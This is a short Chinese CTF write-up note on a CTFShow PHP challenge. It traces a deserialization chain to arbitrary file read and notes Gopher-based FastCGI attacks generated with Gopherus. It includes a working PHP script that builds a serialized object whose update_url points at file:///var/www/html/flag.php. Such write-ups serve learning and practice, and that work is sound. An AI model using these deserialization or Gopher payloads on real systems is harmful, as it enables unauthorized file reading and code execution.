tags:: CTF/伪协议, CTF/RCE, CTF/PHP/CGI

- Gopher 伪协议 [[CTFWEB/伪协议]]打FastCGI
- # 反序列化
	- 和 [[CTFWEB/WP/CTFShow/web308]]相同
	- if判断
	  id:: 62f26cf6-b9b3-4ba5-84e2-d33a5f32a1aa
		- 无
		  id:: 62f26d4c-0663-4721-bc9f-e2adce779080
	- checkVersion
	  id:: 62f26d07-e020-4ced-8d78-5e245c9a8a05
		- dao
		  id:: 62f26d50-b479-482a-b6a5-89c08030c427
			- fun: checkUpdate: ^^伪协议任意文件读取^^
			  id:: 62f26d5d-8540-4858-aa4e-9ae280c07115
	- addDpt
	  id:: 62f26d0d-3bc7-406a-a971-589573f91a09
		- service
		  id:: 62f26d98-d251-40e2-bc00-4bbcccdaf22a
			- insert_dbt
			  id:: 62f26da0-82b2-4613-a2e6-3166d7b66313
				- dao: 普通SQL，无法注入
				  id:: 62f26da5-2a83-4deb-b066-fb31e536bcc9
	- getAllDbt
	  id:: 62f26d1e-a3b3-451b-bfbe-5033b233f0b0
		- service
		  id:: 62f26db2-34c5-4c97-9a90-6ef81cdf928d
			- get_dpt_all
			  id:: 62f26dc5-059c-42c1-9bd3-fc5bddbd1ebd
				- dao: 普通SQL，无法注入
				  id:: 62f26dd1-3108-47b8-ba9a-4637ade9e12b
	- clearCache
	  id:: 62f26d28-5fce-4e10-8318-0f9191e92c26
		- service: 调用dao: clearCache
		  id:: 62f26d36-3b6c-4504-afbb-d2259dce463a
		- dao: shell_exec，但是只能有数字和换行
		  id:: 62f26e00-a110-4827-b830-8bb0308a9012
- 利用，和web308相同
- ```php
  <?php
  class dao{
  	private $config;
  	private $conn;
  	function set_config($config) {
  		$this -> config = $config;
  	}
  }
  
  class config{
  	private $mysql_username='root';
  	private $mysql_password='';
  	private $mysql_db='sds';
  	private $mysql_port=3306;
  	private $mysql_host='localhost';
  	public $cache_dir = 'cache';
  	public $update_url = 'file:///var/www/html/flag.php';
  }
  
  $c = new config();
  $d = new dao();
  $d -> set_config($c);
  echo urlencode(base64_encode(serialize($d)));
  ?>
  ```
-
- # Gopher打SSTI
- 用Gopherus生成Payload
- 需要一个存在的文件，填写`/var/www/html/index.php`
-
-